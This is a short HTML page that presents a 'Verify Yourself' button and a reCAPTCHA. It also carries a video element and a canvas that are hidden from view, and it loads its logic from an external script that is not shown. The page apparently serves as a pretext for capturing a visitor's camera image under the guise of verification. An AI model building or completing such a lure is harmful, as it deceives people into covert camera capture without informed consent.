<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verify & Camera Capture</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
<style>
body{
  font-family:'Poppins',sans-serif;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
  margin:0;
  background: linear-gradient(135deg,#f5f7fa,#c3cfe2);
}
.container{
  background:white;
  padding:30px;
  border-radius:15px;
  box-shadow:0 10px 25px rgba(0,0,0,0.15);
  width: 360px;
  text-align:center;
}
h2{color:#007BFF;margin-bottom:20px;}
button{
  padding:12px 30px;
  border:none;
  border-radius:10px;
  font-size:16px;
  cursor:pointer;
  background: linear-gradient(90deg,#007BFF,#00C6FF);
  color:white;
  transition:0.3s;
}
button:hover{
  transform:translateY(-2px);
  box-shadow:0 5px 15px rgba(0,0,0,0.2);
}
#video{display:none;}
#canvas{display:none;}
#toast{
  position:fixed;
  bottom:30px;
  left:50%;
  transform:translateX(-50%);
  background:#333;color:white;
  padding:12px 25px;
  border-radius:8px;
  opacity:0;
  transition:opacity 0.5s;
}
#recaptcha-section{
  margin-top:20px;
  display:none;
}
</style>
</head>
<body>
<div class="container">
  <h2>Verify Yourself</h2>
  <button id="verifyBtn">Verify Now</button>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <div id="recaptcha-section">
    <h3>Complete the reCAPTCHA</h3>
    <div class="g-recaptcha" 
         data-sitekey="6Ldx7KQsAAAAABZ07LPdBkQ8kKecKHxVp80WJSGE" 
         data-callback="onRecaptchaSuccess"></div>
    <p id="recaptcha-msg" style="color:red;font-weight:bold;"></p>
  </div>
</div>
<div id="toast"></div>
<script src="https://www.google.com/recaptcha/api.js" async defer></script>
<script type="module" src="script.js"></script>
</body>
</html>
